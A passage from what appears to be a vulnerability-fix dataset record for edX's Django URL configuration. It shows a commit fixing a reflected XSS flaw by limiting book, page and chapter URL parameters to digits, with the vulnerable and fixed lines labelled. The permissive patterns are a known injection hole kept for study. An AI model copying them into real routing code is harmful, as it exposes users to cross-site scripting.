url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"}}, "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page.\n\nConflicts:\n\tlms/urls.py"}, "5fad9ccca43cdfb565b3f80914f998afa7f2fa78": {"url": "https://api.github.com/repos/Dalas/edx/commits/5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "html_url": "https://github.com/Dalas/edx/commit/5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "sha": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "keyword": "XSS malicious", "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 51c6ba13b7..b131bb8f0b 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,24 +223,24 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n", "message": "", "files": {"/lms/urls.py": {"changes": [{"diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n", "add": 8, "remove": 8, "filename": "/lms/urls.py", "badparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',"], "goodparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"]}], "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), 